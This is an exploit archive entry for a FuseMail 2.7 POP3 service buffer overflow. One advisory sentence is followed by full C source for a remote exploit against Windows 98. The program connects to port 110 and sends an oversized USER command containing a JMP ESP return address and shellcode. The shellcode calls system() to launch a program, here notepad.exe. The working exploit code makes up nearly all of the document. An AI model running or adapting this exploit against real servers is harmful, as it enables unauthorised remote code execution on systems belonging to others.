source: http://www.securityfocus.com/bid/634/info

There is a buffer overflow in the FuseMail POP service (long USER,PASS) that may allow an intruder to execute arbitrary code on the target server. 

FuseMail 2.7

/*=============================================================================
   FuseMail Version 2.7 Exploit for Windows98
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by UNYUN (shadowpenguin@backsection.net)
  =============================================================================
*/
#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <unistd.h>

#define     BUFSIZE     1159
#define     RETADR      1074
#define     FTP_PORT    110
#define     JMP_ESP     0xbff7a027

unsigned char exploit_code[200]={
0xEB,0x32,0x5B,0x53,0x32,0xE4,0x83,0xC3,
0x0B,0x4B,0x88,0x23,0xB8,0x50,0x77,0xF7,
0xBF,0xFF,0xD0,0x43,0x53,0x50,0x32,0xE4,
0x83,0xC3,0x06,0x88,0x23,0xB8,0x28,0x6E,
0xF7,0xBF,0xFF,0xD0,0x8B,0xF0,0x43,0x53,
0x83,0xC3,0x0B,0x32,0xE4,0x88,0x23,0xFF,
0xD6,0x90,0xEB,0xFD,0xE8,0xC9,0xFF,0xFF,
0xFF,0x00
};
unsigned char cmdbuf[200]="msvcrt.dll.system.notepad.exe";

int     main(int argc,char *argv[])
{
        struct hostent      *hs;
        struct sockaddr_in  cli;
        char                packetbuf[3000],buf[1500];
        int                 sockfd,i,ip;

        if (argc<2){
            printf("usage\n %s HostName\n",argv[0]);
            exit(1);
        }
        bzero(&cli, sizeof(cli));
        cli.sin_family = AF_INET;
        cli.sin_port = htons(FTP_PORT);
        if ((cli.sin_addr.s_addr=inet_addr(argv[1]))==-1){
            if ((hs=gethostbyname(argv[1]))==NULL){
                printf("Can not resolve specified host.\n");
                exit(1);
            }
            cli.sin_family = hs->h_addrtype;
            memcpy((caddr_t)&cli.sin_addr.s_addr,hs->h_addr,hs->h_length);
        }

        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
                perror("socket"); exit(0);
        }

        if(connect(sockfd, (struct sockaddr *)&cli, sizeof(cli)) < 0){
                perror("connect"); exit(0);
        }
        while((i=read(sockfd,packetbuf,sizeof(packetbuf))) > 0){
                packetbuf[i]=0;
                if(strchr(packetbuf,'\n')!=NULL) break;
        }

        strcat(exploit_code,cmdbuf);
        memset(buf,'a',BUFSIZE);
        buf[BUFSIZE]=0;
        ip=JMP_ESP;
        buf[RETADR  ]=ip&0xff;
        buf[RETADR+1]=(ip>>8)&0xff;
        buf[RETADR+2]=(ip>>16)&0xff;
        buf[RETADR+3]=(ip>>24)&0xff;
        strncpy(buf+RETADR+4,exploit_code,strlen(exploit_code));
        sprintf(packetbuf,"USER %s\r\n",buf);
        write(sockfd,packetbuf,strlen(packetbuf));

        while((i=read(sockfd,packetbuf,sizeof(packetbuf))) > 0){
                packetbuf[i]=0;
                if(strchr(packetbuf,'\n')!=NULL) break;
        }

        memset(packetbuf,0,1024);
        sprintf(packetbuf,"PASS sample\r\n");
        write(sockfd,packetbuf,strlen(packetbuf));

        close(sockfd);
}

-------------------